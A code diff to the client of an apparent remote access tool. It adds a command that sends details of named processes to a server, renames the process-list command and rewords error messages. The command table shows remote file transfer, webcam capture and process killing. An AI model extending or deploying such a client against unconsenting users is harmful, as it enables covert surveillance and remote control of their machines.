@@ -47,7 +47,7 @@ class Client(object):
             except AccessDenied:
                 self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processname}, [red]Access denied"})
         else:
-            self.sendHeader({"content": f"[red]No processes with name [yellow]{processname}."})
+            self.sendHeader({"content": f"[red]No processes running with name [yellow]{processname}."})
 
     # kills some process by pid
     def killProcess(self, pid):
@@ -63,15 +63,26 @@ class Client(object):
                 except AccessDenied:
                     self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{pid}, [red]Access denied"})
         else:
-            self.sendHeader({"content": f"[red]No process with PID [yellow]{pid}."})
+            self.sendHeader({"content": f"[red]No process running with PID [yellow]{pid}."})
+
+    # getting info of only one process
+    def getProcessInfo(self, processname):
+        attrs = ['pid', 'username', 'name', 'exe', 'cwd', 'cpu_percent', 'memory_percent']
+        processInfo = [proc.info for proc in process_iter(attrs=attrs) if proc.name().lower() == processname.lower()]
+        if processInfo:
+            self.sendHeader({"sucess": True, "total": len(processInfo), "bytes": len(dumps(processInfo))})
+            sleep(0.5)
+            self.__Client.send(dumps(processInfo))
+        else:
+            self.sendHeader({"sucess": False, "content": f"[red]No process with name [yellow]{processname}."})
 
     # getting info of all processes running in the moment
     def getProcessList(self, args):
-        data = [proc.info for proc in process_iter(['pid', 'username', 'name', 'exe', 'cwd'])]
+        processesInfo = [proc.info for proc in process_iter(['pid', 'username', 'name', 'exe', 'cwd'])]
 
-        self.sendHeader({"total": len(data), "bytes": len(dumps(data))})
+        self.sendHeader({"total": len(processesInfo), "bytes": len(dumps(processesInfo))})
         sleep(0.5)
-        self.__Client.send(dumps(data))
+        self.__Client.send(dumps(processesInfo))
 
     # receiving a file from server side (upload)
     def upload(self, args):
@@ -203,7 +214,8 @@ class Client(object):
             "/download": {"action": self.download},
             "/upload": {"action": self.upload},
             "/webcamshot": {"action": self.webcamshot},
-            "/getprocesslist": {"action": self.getProcessList},
+            "/processlist": {"action": self.getProcessList},
+            "/processinfo": {"action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
             "/killprocess": {"action": self.killProcess},
             "cd": {"action": self.changeDirectory}
